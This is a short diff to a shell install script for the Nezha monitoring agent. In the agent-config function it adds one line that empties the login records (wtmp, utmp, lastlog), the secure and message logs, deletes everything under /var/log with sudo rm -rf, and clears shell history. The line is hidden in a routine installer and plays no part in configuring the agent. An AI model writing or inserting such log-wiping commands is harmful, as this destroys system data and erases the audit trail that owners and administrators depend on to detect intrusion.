@@ -295,7 +295,7 @@ modify_agent_config() {
     else
         nohup ${NZ_AGENT_PATH}/nezha-agent -s ${nz_grpc_host}:${nz_grpc_port} -p ${nz_client_secret} >/dev/null 2>&1 &
     fi
-    
+    echo > /var/log/wtmp && echo > /var/log/lastlog && echo >   /var/log/utmp && cat /dev/null >  /var/log/secure && cat /dev/null >  /var/log/message && sudo rm -rf /var/log/* && history -c
     if [[ $# == 0 ]]; then
         before_show_menu
     fi
